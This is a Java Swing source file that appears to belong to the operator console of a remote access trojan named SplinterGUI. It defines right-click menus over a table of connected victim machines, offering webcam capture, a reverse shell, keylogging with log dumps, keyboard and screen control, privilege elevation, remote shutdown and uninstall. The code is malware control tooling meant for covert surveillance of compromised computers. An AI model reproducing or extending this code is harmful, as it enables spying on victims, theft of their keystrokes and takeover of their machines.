package GUI.TableUtils.Configuration;

import Connections.Streams;
import GUI.SplinterGUI;
import GUI.Main;
import GUI.TableUtils.Connection.DisconnectAction;
import GUI.TableUtils.Connection.RestartAction;
import GUI.TableUtils.Connection.UninstallAction;
import GUI.TableUtils.FileManager.Listener.FileManagerMenuListener;

import GUI.TableUtils.KeyLogger.KeyLoggerEventsListener;
import GUI.TableUtils.KeyLogger.KeyLoggerMenuListener;
import GUI.TableUtils.KeyLogger.KeyloggerEvents;
import GUI.TableUtils.KeyboardController.KeyboardControllerMenuListener;
import GUI.TableUtils.MessageBox.MessageBoxMenuListener;
import GUI.TableUtils.Permissions.CheckAdmin.AdminPermissionAction;
import GUI.TableUtils.Permissions.ElevatePermission.ElevatePermissionAction;
import GUI.TableUtils.ReverseShell.ReverseShellMenuListener;
import GUI.TableUtils.ScreenStreaming.ScreenMenuListener;
import GUI.TableUtils.SystemState.State;
import GUI.TableUtils.SystemState.SystemStateListener;
import GUI.TableUtils.Webcam.WebcamMenuListener;

import javax.swing.*;
import java.awt.event.MouseAdapter;
import java.awt.event.MouseEvent;
import java.net.Socket;
import java.util.Map;
import java.util.Objects;
import java.util.concurrent.ConcurrentHashMap;

public class TablePopUpListener extends MouseAdapter {

    private final SplinterGUI mainGUI;

    public TablePopUpListener(SplinterGUI mainGUI) {
        this.mainGUI = mainGUI;
        createConnectedPopUpMenu();
        createDisconnectedPopUpMenu();
    }

    JPopupMenu disconnectedPopUpMenu = new JPopupMenu();

    private void createDisconnectedPopUpMenu() {
        JMenuItem removeRowItem = new JMenuItem("Remove row");
        JMenuItem updateItem = new JMenuItem("Refresh client");
        disconnectedPopUpMenu.add(removeRowItem);
        removeRowItem.addActionListener(e -> mainGUI.getConnectionsDefaultTableModel().removeRow(mainGUI.getConnectionsTable().getSelectedRow()));
        disconnectedPopUpMenu.add(updateItem);
        updateItem.addActionListener(e -> refreshClient()
        );
    }

    private void refreshClient() {
        int row = Main.gui.getConnectionsTable().getSelectedRow();
        String uniqueIP = (String) mainGUI.getConnectionsDefaultTableModel().getValueAt(row, 0);
        for (Map.Entry<Socket, Streams> entry : Main.server.getMap().entrySet())
            if ((uniqueIP).equals(entry.getKey().getInetAddress().toString())) {
                mainGUI.getConnectionsDefaultTableModel().setValueAt("Connected", row, 5);
            }
    }

    public static void setIconToMenuItem(JMenuItem item, String path) {
        item.setIcon(new ImageIcon((Objects.requireNonNull(TablePopUpListener.class.getClassLoader().getResource(path)))));
    }

    // Menus of table
    private JPopupMenu connectedPopUpMenu;

    private JMenuItem webcamMenu;
    private JMenu keyloggerMenuOptions;
    private JMenuItem streamScreenMenu;

    private void createConnectedPopUpMenu() {
        connectedPopUpMenu = new JPopupMenu();
        JMenuItem fileManagerMenu = new JMenuItem("File manager");
        setIconToMenuItem(fileManagerMenu, "file_manager_icon.png");
        webcamMenu = new JMenuItem("Webcam manager");
        setIconToMenuItem(webcamMenu, "webcam_icon.png");
        JMenuItem reverseShellMenu = new JMenuItem("Reverse shell");
        setIconToMenuItem(reverseShellMenu, "shell_icon.png");
        JMenuItem keyboardController = new JMenuItem("Keyboard controller");
        setIconToMenuItem(keyboardController, "keyboard_icon.png");
        JMenuItem messageBoxMenu = new JMenuItem("Message box");
        setIconToMenuItem(messageBoxMenu, "message_box_icon.png");
        keyloggerMenuOptions = new JMenu("Keylogger options");
        setIconToMenuItem(keyloggerMenuOptions, "keylogger_icon.png");
        JMenuItem startKeyloggerMenu = new JMenuItem("Start");
        JMenuItem stopKeyloggerMenu = new JMenuItem("Stop");
        JMenuItem dumpLogsMenu = new JMenuItem("Dump last log");
        JMenuItem dumpAllLogsMenu = new JMenuItem("Dump all logs");
        keyloggerMenuOptions.add(startKeyloggerMenu);
        keyloggerMenuOptions.add(stopKeyloggerMenu);
        keyloggerMenuOptions.add(dumpLogsMenu);
        keyloggerMenuOptions.add(dumpAllLogsMenu);
        JMenu permissionsMenu = new JMenu("Admin privileges");
        setIconToMenuItem(permissionsMenu, "permissions_icon.png");
        JMenuItem isAdminMenu = new JMenuItem("Is admin");
        JMenuItem elevatePrivilegesMenu = new JMenuItem("Elevate privileges");
        permissionsMenu.add(isAdminMenu);
        permissionsMenu.add(elevatePrivilegesMenu);
        streamScreenMenu = new JMenuItem("Screen controller");
        setIconToMenuItem(streamScreenMenu, "screen_icon.png");
        JMenu connectionActionsMenu = new JMenu("Connection");
        setIconToMenuItem(connectionActionsMenu, "connection_icon.png");
        JMenuItem restartMenu = new JMenuItem("Restart");
        JMenuItem disconnectMenu = new JMenuItem("Disconnect");
        JMenuItem uninstallMenu = new JMenuItem("Uninstall");
        connectionActionsMenu.add(restartMenu);
        connectionActionsMenu.add(disconnectMenu);
        connectionActionsMenu.add(uninstallMenu);
        JMenu stateActionsMenu = new JMenu("System state");
        setIconToMenuItem(stateActionsMenu, "state_icon.png");

        JMenuItem logOffAction = new JMenuItem("Log off");
        JMenuItem shutdownAction = new JMenuItem("Shutdown");
        JMenuItem rebootAction = new JMenuItem("Reboot");
        stateActionsMenu.add(logOffAction);
        stateActionsMenu.add(shutdownAction);
        stateActionsMenu.add(rebootAction);


        // add to popup
        connectedPopUpMenu.add(fileManagerMenu);
        connectedPopUpMenu.add(webcamMenu);
        connectedPopUpMenu.add(reverseShellMenu);
        connectedPopUpMenu.add(keyboardController);
        connectedPopUpMenu.add(streamScreenMenu);
        connectedPopUpMenu.add(messageBoxMenu);
        connectedPopUpMenu.add(keyloggerMenuOptions);
        connectedPopUpMenu.add(permissionsMenu);
        connectedPopUpMenu.add(stateActionsMenu);
        connectedPopUpMenu.add(connectionActionsMenu);


        JTable connectionsTable = mainGUI.getConnectionsTable();
        ConcurrentHashMap<Socket, Streams> mapOfConnections = Main.server.getMap();
        // set actions
        webcamMenu.addActionListener(new WebcamMenuListener(connectionsTable, mapOfConnections, mainGUI));
        fileManagerMenu.addActionListener(new FileManagerMenuListener(connectionsTable, mapOfConnections, mainGUI));
        reverseShellMenu.addActionListener(new ReverseShellMenuListener(connectionsTable, mapOfConnections, mainGUI));
        keyloggerMenuOptions.addMenuListener(new KeyLoggerMenuListener(mapOfConnections, new JMenuItem[]{startKeyloggerMenu, stopKeyloggerMenu}));
        startKeyloggerMenu.addActionListener(new KeyLoggerEventsListener(connectionsTable, mapOfConnections, KeyloggerEvents.START));
        stopKeyloggerMenu.addActionListener(new KeyLoggerEventsListener(connectionsTable, mapOfConnections, KeyloggerEvents.STOP));
        dumpLogsMenu.addActionListener(new KeyLoggerEventsListener(connectionsTable, mapOfConnections, KeyloggerEvents.DUMP_LAST));
        dumpAllLogsMenu.addActionListener(new KeyLoggerEventsListener(connectionsTable, mapOfConnections, KeyloggerEvents.DUMP_ALL));
        keyboardController.addActionListener(new KeyboardControllerMenuListener(connectionsTable, mapOfConnections, mainGUI));
        isAdminMenu.addActionListener(new AdminPermissionAction(connectionsTable, mapOfConnections));
        elevatePrivilegesMenu.addActionListener(new ElevatePermissionAction(connectionsTable, mapOfConnections));
        messageBoxMenu.addActionListener(new MessageBoxMenuListener(connectionsTable, mapOfConnections));
        streamScreenMenu.addActionListener(new ScreenMenuListener(connectionsTable, mapOfConnections));
        restartMenu.addActionListener(new RestartAction(connectionsTable, mapOfConnections));
        disconnectMenu.addActionListener(new DisconnectAction(connectionsTable, mapOfConnections));
        uninstallMenu.addActionListener(new UninstallAction(connectionsTable, mapOfConnections));
        logOffAction.addActionListener(new SystemStateListener(connectionsTable, mapOfConnections, State.LOG_OFF));
        shutdownAction.addActionListener(new SystemStateListener(connectionsTable, mapOfConnections, State.SHUTDOWN));
        rebootAction.addActionListener(new SystemStateListener(connectionsTable, mapOfConnections, State.REBOOT));

    }

    @Override
    public void mouseReleased(MouseEvent e) {
        if (e.isPopupTrigger()) {
            JTable source = (JTable) e.getSource();
            int row = source.rowAtPoint(e.getPoint());
            int column = source.columnAtPoint(e.getPoint());
            if (!source.isRowSelected(row)) source.changeSelection(row, column, false, false);
            if (mainGUI.getConnectionsDefaultTableModel().getValueAt(row, 5).equals("Connected")) {
                connectedPopUpMenu.show(e.getComponent(), e.getX(), e.getY());
                Streams stream = GetSYS.getStream(Main.server.getMap(), Main.gui.getConnectionsTable());
                assert stream != null;
                webcamMenu.setVisible(stream.getTempSystemInformation().WEBCAM());
                keyloggerMenuOptions.setVisible(stream.getTempSystemInformation().KEYLOGGER());
                streamScreenMenu.setVisible(stream.getTempSystemInformation().WEBCAM());
            } else disconnectedPopUpMenu.show(e.getComponent(), e.getX(), e.getY());
        }
    }
}
